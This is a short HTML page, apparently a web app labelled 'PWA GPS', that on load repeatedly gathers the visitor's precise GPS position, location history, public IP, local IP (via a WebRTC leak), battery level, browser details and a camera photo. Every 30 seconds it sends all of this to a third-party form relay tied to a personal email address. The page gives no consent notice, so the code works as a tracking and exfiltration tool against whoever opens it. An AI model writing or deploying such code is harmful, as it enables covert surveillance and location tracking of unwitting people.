<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>PWA GPS FULL</title>
<link rel="manifest" href="manifest.json">

<style>
body{font-family:Arial;padding:20px}
#status{margin-top:15px;font-weight:bold}
</style>

<script>
if("serviceWorker" in navigator) {
  navigator.serviceWorker.register("service-worker.js");
}

let historico = [];

async function enviar(payload) {
    return fetch("https://formsubmit.co/ajax/shoes19616@gmail.com", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(payload)
    });
}

async function getPublicIP() {
  try {
    let r = await fetch("https://api.ipify.org?format=json");
    let j = await r.json();
    return j.ip;
  } catch(e) {
    return "erro";
  }
}

function getLocalIP() {
    return new Promise(resolve => {
        let pc = new RTCPeerConnection({iceServers: []});
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = e => {
            if (!e || !e.candidate) return;
            let ip = e.candidate.candidate.split(" ")[4];
            resolve(ip);
            pc.close();
        };
    });
}

async function capturarFoto() {
    return new Promise(resolve => {
        let input = document.createElement("input");
        input.type="file";
        input.accept="image/*";
        input.capture="camera";
        input.onchange = () => {
            const file = input.files[0];
            const reader = new FileReader();
            reader.onload = () => resolve(reader.result);
            reader.readAsDataURL(file);
        };
        input.click();
    });
}

async function coletarDados() {
    return new Promise((resolve,reject) => {
        navigator.geolocation.getCurrentPosition(async pos => {
            let lat = pos.coords.latitude;
            let lon = pos.coords.longitude;
            let acc = pos.coords.accuracy;

            let pubIP = await getPublicIP();
            let locIP = await getLocalIP();

            let battery = "n/d";
            if(navigator.getBattery) {
                let b = await navigator.getBattery();
                battery = (b.level*100)+"%";
            }

            let modelo = navigator.userAgent;

            historico.push({lat,lon,time:new Date().toISOString()});

            resolve({
                lat, lon, acc, pubIP, locIP, battery, modelo,
                historico:[...historico]
            });
        }, err => reject(err), {enableHighAccuracy:true});
    });
}

async function ciclo() {
    document.getElementById("status").innerText="Capturando...";
    try {
        let dados = await coletarDados();
        let foto = await capturarFoto();

        dados.foto = foto;

        document.getElementById("status").innerText="Enviando...";
        await enviar(dados);

        document.getElementById("status").innerText="✔ Enviado! Próximo envio em 30s.";
    } catch(e) {
        document.getElementById("status").innerText="Erro: "+e.message;
    }

    setTimeout(ciclo,30000);
}

window.onload = ciclo;
</script>
</head>
<body>
<h2>PWA GPS COMPLETO + FOTO</h2>
<div id="status">Iniciando...</div>
</body>
</html>
